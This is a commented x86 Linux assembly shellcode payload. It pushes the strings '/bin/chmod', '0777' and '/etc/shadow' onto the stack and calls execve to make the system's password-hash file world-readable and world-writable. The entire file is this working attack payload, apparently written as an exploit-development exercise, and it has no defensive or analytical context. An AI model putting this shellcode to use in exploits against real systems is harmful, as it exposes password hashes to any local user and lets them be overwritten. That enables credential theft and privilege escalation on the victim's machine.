global _start

section .text
_start:

	xor eax, eax		; clear eax
	
	push eax		; push the value 0 to the stack
	
	; push 0x776f6461
	mov dword [esp-4], 0x776f6461	; "adow" is saved to the stack

	; push 0x68732f2f
	mov dword [esp-8], 0x68732f2f	; "//sh" is saved to the stack

	; push 0x6374652f
	mov dword [esp-12], 0x6374652f	; "/etc" is saved to the stack

	sub esp, 12		; esp points at the top of the stack, where is th string "/etc//shadow"

	mov esi, esp		; esi now points at the string at the top of the stack

	push eax		; push the value 0 to the stack
	
	push 0x37373730		; push "0777" (permissions) to the stack
	mov ebp, esp		; ebp now points at the string at the top of the stack, where is the string "0777"

	push eax			; push the value 0 to the stack

	; push  0x646f6d68
	mov dword [esp-4], 0x646f6d68	; "hmod" is saved to the stack
	
	; push  0x632f6e69
	mov dword [esp-8], 0x632f6e69	; "in/c" is saved to the stack
	
	; push  0x622f2f2f
	mov dword [esp-12], 0x622f2f2f	; "///b" is saved to the stack

	sub esp, 12			; esp points at the top of the stack, where is th string "///bin/chmod"

	mov ebx, esp			; ebx now points at the string at the top of the stack 

	push eax			; push the value 0 to the stack
	push esi			; push "/etc//shadow"
	push ebp			; push "0777"
	push ebx			; push "///bin/chmod"

	mov ecx, esp			; ecx points at the top of the stack
	
	mov al, 0xb			; b is the hex value of the decimal 11 for execve syscall 

	int 0x80			; exec execve syscall
